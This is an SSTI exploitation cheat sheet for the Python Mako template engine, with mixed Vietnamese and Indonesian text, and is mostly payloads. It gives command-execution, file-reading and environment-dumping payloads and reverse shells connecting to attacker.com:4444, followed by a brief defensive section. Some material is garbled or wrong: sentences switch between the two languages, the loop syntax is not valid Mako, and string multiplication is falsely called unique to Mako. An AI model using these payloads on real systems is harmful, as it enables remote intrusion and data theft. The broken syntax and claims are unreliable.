# 11 - Mako (Python)

## Tổng Quan

**Mako** là template engine Python khác yang cho phép embedded Python code. Sering digunakan dalam:

- SQLAlchemy
- Pyramid Framework
- Standalone templating

## Cú Pháp Cơ Bản

```mako
<% # Python code block %>
${ expression }         <!-- Output expression -->
${ user.name }
<% for item in items %>
  ${ item }
<% endfor %>

## Whitespace-sensitive like Python
```

## Karakteristik Unik Mako

### Python Code Execution

Mako memungkinkan embedded Python code langsung dalam template:

```mako
<%
import os
result = os.popen('id').read()
%>
Result: ${ result }
```

### Expressions

```mako
${ 7*7 }                → 49
${ 'hello' * 3 }        → hellohellohello
${ len([1,2,3]) }       → 3
```

## SSTI Detection

```mako
${ 7*7 }                → 49
<% x = 7*7 %>
${ x }                  → 49

## Error on undefined
${ undefined_var }      → Error
```

## RCE via Python Code Blocks

### Direct OS Command

```mako
<%
import os
os.system('whoami')
%>

# Or one-liner
${ __import__('os').system('id') }
```

### Subprocess

```mako
<%
import subprocess
result = subprocess.check_output(['whoami'], shell=True)
%>
${ result }

# Via expression
${ __import__('subprocess').check_output(['id']) }
```

### File Operations

```mako
<%
with open('/etc/passwd', 'r') as f:
    content = f.read()
%>
${ content }

# Via expression
${ open('/etc/passwd').read() }
```

## Most Dangerous: Python Embedding

Mako paling berbahaya karena dapat embed Python langsung:

```mako
<%
import os, subprocess

# Direct shell access
os.chdir('/home')
files = os.listdir('.')
%>

Files: ${ files }
```

## Exploitation Workflow

### Step 1: Detect Mako

```mako
${ 7*7 }        → 49
${ 'x'*3 }      → xxx  (different from Jinja2 which might error)
```

### Step 2: Code Block Injection

```mako
<%
import os
print(os.popen('id').read())
%>
```

### Step 3: RCE

```mako
<%
import subprocess
subprocess.call(['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'])
%>
```

## Obfuscated Payloads

### Indented Code Blocks

```mako
<%
  import os
  os.system('id')
%>
```

### Expression Injection

```mako
${ __import__('os').popen('id').read() }
```

### One-liner

```mako
<% __import__('os').system('whoami') %>
```

## Data Exfiltration

### File Reading

```mako
${ open('/etc/passwd').read() }
${ open('C:\\Windows\\win.ini').read() }  <!-- Windows -->
```

### Environment

```mako
${ __import__('os').environ }
${ __import__('os').environ['PATH'] }
```

### Directory Listing

```mako
${ __import__('os').listdir('/') }
${ __import__('os').listdir('C:\\Windows') }
```

## Reverse Shell

### Python Reverse Shell

```mako
<%
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
subprocess.call(['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
%>
```

### Bash via Python

```mako
${ __import__('os').system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"') }
```

## Mako-Specific Features

### Template Variables

```mako
${ self.filename }      <!-- Template filename -->
${ self.module }        <!-- Module info -->
${ context }            <!-- Template context -->
```

### Can Be Exploited

```mako
<!-- Access context to find sensitive data -->
${ context.keys() }     <!-- All variables -->
${ context['secret'] }
```

## Blind SSTI in Mako

### Time-Based

```mako
<%
import time
if 7*7 == 49:
    time.sleep(5)
%>
```

### Write to File

```mako
<%
with open('/tmp/pwned.txt', 'w') as f:
    f.write('success')
%>
```

## Detection Payloads

```mako
# Math
${ 7*7 }                → 49

# String multiply (unique to Mako)
${ 'x'*3 }              → xxx

# Python code
<%
# If accepted, likely Mako
x = 1 + 1
%>
${ x }                  → 2
```

## Mako Security Configuration

```python
# Safe configuration
from mako.template import Template
from mako import parsetree

# Define safe context
safe_context = {
    'user_name': user.name,
    'items': items,
    # Don't include: os, sys, subprocess, __import__
}

# Use pre-compiled templates
template = Template(filename="templates/safe.html")
output = template.render(**safe_context)

# OR use template string with limited context
template_string = "Hello ${name}"
template = Template(text=template_string)
output = template.render(name=user_input)  # SAFE
```

## Defensive Measures

1. **Never allow dynamic template source from users**
2. **Pre-compile templates offline**
3. **Use strict context (whitelist safe variables)**
4. **Run Mako with limited module access**
5. **Use sandboxing or containerization**
6. **Log template rendering for audit**

## Tài Liệu Liên Quan

- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
- [09-jinja2-python.md](09-jinja2-python.md) - Jinja2
